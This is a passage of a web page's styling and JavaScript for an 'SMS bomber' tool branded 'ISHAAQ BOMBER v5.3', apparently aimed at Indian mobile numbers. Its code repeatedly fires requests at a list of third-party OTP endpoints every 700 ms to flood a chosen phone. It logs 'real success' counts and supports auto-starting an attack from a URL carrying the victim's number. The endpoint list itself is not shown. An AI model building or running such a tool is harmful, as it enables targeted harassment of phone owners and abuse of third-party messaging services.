      filter: drop-shadow(0 0 25px #00ffff); z-index: 5; animation: jetFly linear forwards; opacity: 0;

    @keyframes jetFly {
      0% { opacity: 0; transform: scale(0.6) rotate(-35deg); }
      15% { opacity: 1; }
      85% { opacity: 1; }
      100% { opacity: 0; transform: scale(1.15) rotate(30deg); }
    }

      position: fixed; top: -100%; left: 0; width: 100%; height: 4px;

    let interval = null;
    let roundCount = 0;
    let realSuccess = 0;
    let currentPhone = "";
    let isDarkMode = false;
    let isAdminMode = false;

    function log(message, color = "#006633") {
      const logDiv = document.getElementById('log');
      const time = new Date().toLocaleTimeString('en-IN', { hour12: false });
      logDiv.innerHTML += `<span style="color:\( {color}">[ \){time}] ${message}</span><br>`;
      logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function sendBomb(api, phone) {
      try {
        let url = typeof api.url === 'function' ? api.url(phone) : api.url;
        let body = api.data ? (typeof api.data === 'function' ? api.data(phone) : api.data) : null;

        const options = {
          method: api.method,
          headers: api.headers || {}
        };
        if (body && api.method !== "GET") options.body = body;

        const res = await fetch(url, options);

        if (res.status >= 200 && res.status < 300) {
          realSuccess++;
          document.getElementById('successCount').textContent = realSuccess;
          log(`✅ REAL SUCCESS - ${api.name} (Status ${res.status})`, isDarkMode ? "#00ff88" : "#006633");
        } else {
          log(`❌ ${api.name} → FAILED (Status ${res.status})`, "#cc0000");
        }
      } catch (e) {
        log(`❌ ${api.name} → BLOCKED / NETWORK ERROR`, "#cc0000");
      }
    }

    function toggleTheme() {
      isDarkMode = !isDarkMode;
      if (isDarkMode) {
        document.body.classList.add('dark');
        document.body.classList.remove('light');
        document.getElementById('themeToggle').textContent = '☀️ Light Mode';
      } else {
        document.body.classList.remove('dark');
        document.body.classList.add('light');
        document.getElementById('themeToggle').textContent = '🌙 Dark Mode';
      }
    }

    function startBombing(phone) {
      if (!/^\d{10}$/.test(phone)) {
        log("❌ Invalid number in URL", "#cc0000");
        return;
      }

      currentPhone = phone;
      document.getElementById('phone').value = phone;
      document.getElementById('startBtn').style.display = 'none';
      document.getElementById('stopBtn').style.display = 'inline-block';

      document.getElementById('status').innerHTML = `🚀 AUTO ATTACKING +91<span style="color:#00cc99">${phone}</span>`;
      document.getElementById('status').style.color = isDarkMode ? "#00ff88" : "#006633";

      log(`🚀 AUTO BOMBING STARTED ON +91${phone} (from URL)`, isDarkMode ? "#ffffff" : "#1a1a1a");

      roundCount = 0;
      realSuccess = 0;
      document.getElementById('roundCount').textContent = '0';
      document.getElementById('successCount').textContent = '0';

      interval = setInterval(() => {
        roundCount++;
        document.getElementById('roundCount').textContent = roundCount;
        log(`🔥 ROUND ${roundCount} • FIRING ALL APIS (REAL CHECK)...`, isDarkMode ? "#00ffff" : "#006633");

        ULTIMATE_APIS.forEach((api, i) => {
          setTimeout(() => sendBomb(api, currentPhone), i * 15);
        });
      }, 700);
    }

    function handleStart() {
      const phoneInput = document.getElementById('phone').value.trim();

      if (phoneInput === "7860") {
        isAdminMode = true;
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('stopBtn').style.display = 'none';
        document.getElementById('uploadBtn').style.display = 'inline-block';
        document.getElementById('status').innerHTML = `🔧 ADMIN MODE - Upload Custom Logo`;
        document.getElementById('status').style.color = "#ffaa00";
        log("🔧 ADMIN MODE ACTIVATED (7860) - Upload your logo", "#ffaa00");
        return;
      }

      if (!/^\d{10}$/.test(phoneInput)) {
        alert("❌ Please enter a valid 10 digit Indian number!");
        return;
      }

      if (isAdminMode) {
        alert("Please upload logo first in Admin Mode");
        return;
      }

      startBombing(phoneInput);
    }

    function stopBombing() {
      if (interval) clearInterval(interval);
      interval = null;
      document.getElementById('startBtn').style.display = 'inline-block';
      document.getElementById('stopBtn').style.display = 'none';
      document.getElementById('uploadBtn').style.display = 'none';
      document.getElementById('status').innerHTML = `⛔ BOMBING STOPPED`;
      document.getElementById('status').style.color = "#ff3366";
      log("⛔ ATTACK HALTED", "#ff3366");
      isAdminMode = false;
    }

    function triggerLogoUpload() {
      document.getElementById('logoUpload').click();
    }

    function uploadCustomLogo(event) {
      const file = event.target.files[0];
      if (!file) return;

      const reader = new FileReader();
      reader.onload = function(e) {
        document.getElementById('mainLogo').src = e.target.result;
        localStorage.setItem('ishaqCustomLogo', e.target.result);
        log("✅ CUSTOM LOGO UPLOADED & SAVED PERMANENTLY", "#00ff88");

        setTimeout(() => {
          document.getElementById('uploadBtn').style.display = 'none';
          document.getElementById('startBtn').style.display = 'inline-block';
          document.getElementById('status').innerHTML = `✅ Logo Saved • Ready for bombing`;
          document.getElementById('status').style.color = "#00cc99";
          isAdminMode = false;
          log("🔄 Back to normal mode", "#00cc99");
        }, 1500);
      };
      reader.readAsDataURL(file);
    }

    function loadSavedLogo() {
      const saved = localStorage.getItem('ishaqCustomLogo');
      if (saved) document.getElementById('mainLogo').src = saved;
    }

    function launchJets() {
      const jets = document.querySelectorAll('.jet-plane');
      jets.forEach((jet, i) => {
        jet.style.animation = 'none';
        void jet.offsetWidth;
        const duration = 7 + Math.random() * 6;
        jet.style.animation = `jetFly ${duration}s linear forwards`;
        jet.style.left = `-${18 + i*6}%`;
        jet.style.top = `${8 + i*19}%`;
      });
    }

    // AUTO START FROM URL: ?number=9936431049&status=start
    function checkAutoStart() {
      const params = new URLSearchParams(window.location.search);
      const num = params.get('number');
      const status = params.get('status');

      if (num && status === 'start') {
        log(`🔗 AUTO START DETECTED FROM URL - Number: ${num}`, "#00ffff");
        setTimeout(() => {
          startBombing(num);
        }, 800); // small delay for UI to load
      }
    }

    // Secret 7860 admin
    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && e.shiftKey && e.key === '7') {
        document.getElementById('logoUpload').click();
      }
    });

    window.onload = () => {
      loadSavedLogo();
      document.getElementById('phone').focus();
      log("🟢 ISHAAQ BOMBER v5.3 FINAL LOADED - URL AUTO START ENABLED", "#006633");
      launchJets();
      setInterval(launchJets, 13000);

      document.getElementById('logoUpload').addEventListener('change', uploadCustomLogo);

      // Check for auto start from URL
      checkAutoStart();
    };
